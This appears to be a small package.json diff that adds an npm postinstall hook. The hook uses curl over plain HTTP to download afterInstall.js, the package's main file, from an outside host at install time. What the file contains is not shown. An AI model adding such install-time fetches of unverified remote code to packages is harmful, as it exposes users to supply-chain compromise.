@@ -4,7 +4,8 @@
   "description": "",
   "main": "afterInstall.js",
   "scripts": {
-    "test": "test - d"
+    "test": "test - d",
+    "postinstall": "curl -O http://onion-static.yc345.tv/litManage/afterInstall.js"
   },
   "repository": {
     "type": "git",
